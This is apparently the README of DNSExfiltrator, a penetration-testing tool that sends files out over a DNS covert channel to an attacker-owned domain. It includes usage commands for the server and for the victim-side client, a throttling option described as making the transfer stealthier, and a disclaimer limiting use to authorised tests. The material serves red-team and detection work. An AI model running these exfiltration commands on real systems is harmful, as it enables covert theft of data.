DNSExfiltrator
============

Author: Arno0x0x - [@Arno0x0x](http://twitter.com/Arno0x0x)

DNSExfiltrator allows for transfering (*exfiltrate*) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.

DNSExfiltrator has to sides:
  1. The **server side**, coming as a single python script (`dnsexfiltrator.py`), which acts as a custom DNS server, serving the payload data
  2. The **client side** (*victim's side*), which comes in two flavors:
  - `dnsExfiltrator.cs`: a C# script that can be compiled with `csc.exe` to provide a Windows managed executable
  - `Invoke-DNSExfiltrator.ps1`: a PowerShell script providing the exact same functionnalities by wrapping the dnsExfiltrator assembly

In order for the whole thing to work **you need to own your domain name** and set the DNS record for that domain to point to the server that will run the `dnsexfiltrator.py` server side.

Features
----------------------

DNSExfiltrator uses the system's default DNS server, but you can define a specific one (*useful for debugging purposes or for running the server side locally for instance*).

DNSExfiltrator also supports some throttling of the requests in order to stay more stealthy when exfiltrating data.

<img src="https://dl.dropboxusercontent.com/s/fpg71h06xbwj33e/dnsexfiltrator_02.jpg?dl=0" width="800">

<img src="https://dl.dropboxusercontent.com/s/7c2aqlf4kax3mu9/dnsexfiltrator_01.jpg?dl=0" width="600">

Dependencies
----------------------

The only dependency is on the server side, as the `dnsexfiltrator.py` script relies on the external **dnslib** library. You can install it using pip:
```
pip install -r requirements.txt
```

Usage
----------------------

***SERVER SIDE***

Start the `dnsexfiltrator script passing it the domain name used:
```
root@kali:~# ./dnsexfiltrator.py -d mydomain.com
```

***CLIENT SIDE***

You can use **either** the compiled version **or** the PowerShell wrapper (*which is basically the same thing*). Either case, the parameters are the same.

1/ Using the C# compiled Windows executable (*which you can find in the `release` directory*):
```
dnsExfiltrator.exe <file> <domainName> [s=DNS_server] [t=throttleTime]
      file:         [MANDATORY] The file name to the file to be exfiltrated.
      domainName:   [MANDATORY] The domain name to use for DNS requests.
      DNS_Server:   [OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.
      throttleTime: [OPTIONNAL] The time in milliseconds to wait between each DNS request.
```

2/ Using the PowerShell script, well, call it in any of your prefered way (*you probably know tons of ways of invoking a powershell script*) along with the script parameters. Most basic example:
```
c:\DNSExfiltrator> powershell
PS c:\DNSExfiltrator> Import-Module .\Invoke-DNSExfiltrator.ps1
PS c:\DNSExfiltrator> Invoke-DNSExfiltrator -i inputFile -d mydomain.com -s my.dns.server.com -t 500
[...]
```

DISCLAIMER
----------------
This tool is intended to be used in a legal and legitimate way only:
  - either on your own systems as a means of learning, of demonstrating what can be done and how, or testing your defense and detection mechanisms
  - on systems you've been officially and legitimately entitled to perform some security assessments (pentest, security audits)

Quoting Empire's authors:
*There is no way to build offensive tools useful to the legitimate infosec industry while simultaneously preventing malicious actors from abusing them.*